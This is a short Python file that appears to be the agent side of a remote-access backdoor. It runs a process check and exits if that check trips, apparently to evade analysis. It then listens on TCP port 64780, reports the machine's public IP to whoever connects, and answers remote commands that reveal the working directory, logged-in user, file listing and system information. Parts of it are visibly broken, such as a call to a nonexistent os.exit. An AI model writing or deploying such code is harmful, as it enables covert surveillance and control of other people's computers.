import json, os, socket
from resources.misc import sysinfo
from socket import socket, AF_INET, SOCK_STREAM
from resources.protection import proc_check, fake_mutex_code
from requests import get

port = 64780
#host_IP = "127.0.0.1"  # need to be loopback

if proc_check():
    os.exit(0)

with socket(AF_INET, SOCK_STREAM) as s:
    s.bind(('', port))
    #s.setblocking(False)
    #s.listen(2)
    #print("started listening")
    #conn, addr = s.accept()

    #try:
    #    s.listen()
    #    conn, addr = s.accept()
    #    print("listening")
    #    ip = get('https://api.ipify.org').text
    #    conn.sendall(bytes(ip, encoding="utf-8"))
    #except socket.error as msg:
    #    s.close()

    while True:

        try:
            s.listen()
            conn, addr = s.accept()
            print("listening")
            ip = get('https://api.ipify.org').text
            conn.sendall(bytes(ip, encoding="utf-8"))
        except socket.error as msg:
            s.close()
            continue

        cmnd = conn.recv(2048).decode()
        print(cmnd)

        if cmnd.lower() == "kill":
            print("exiting")
            s.close()
            break
        elif cmnd.lower() == "pwd":
            result = os.path.dirname(os.path.realpath(__file__))
        elif cmnd.lower() == "user":
            result = os.getlogin()
        elif cmnd.lower() == "listdir":
            result = json.dumps(os.listdir())
            print (result)
        elif cmnd.lower() == "sysinfo":
            result = sysinfo()
        else:
            result = "passing"
            continue

        conn.sendall(bytes(result, encoding="utf-8"))